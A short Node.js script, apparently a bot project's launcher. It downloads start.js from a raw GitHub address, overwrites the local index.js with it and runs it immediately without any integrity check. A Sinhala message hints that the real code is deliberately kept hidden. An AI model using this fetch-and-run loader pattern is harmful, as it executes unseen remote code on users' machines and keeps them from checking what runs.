const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { spawn } = require('child_process');

if (require("./package.json").version == "2.0.0") {
    return console.log("decrypt karanna EPA pko");
}

const filesToDownload = [
    {
        url: 'https://raw.githubusercontent.com/vimu-max11111g/Susaaks/main/start.js',
        destination: './index.js'
    }
];

const downloadFile = async (url, destination) => {
    const writer = fs.createWriteStream(destination);
    const response = await axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
};

const downloadAllFiles = async () => {
    for (const file of filesToDownload) {
        try {
            await downloadFile(file.url, path.resolve(__dirname, file.destination));
            console.log(`✅ Downloaded ${file.destination}`);
        } catch (error) {
            console.error(`❌ Error downloading ${file.destination}:`, error.message);
        }
    }
};
const startIndex = () => {
    console.log('🔄 Starting index.js...');
    
    const process = spawn('node', ['index.js'], { stdio: 'inherit' });
  
}
downloadAllFiles()

.then(() => {
        startIndex()
    })
    .catch(error => {
        console.error('Error downloading files:', error);
    });
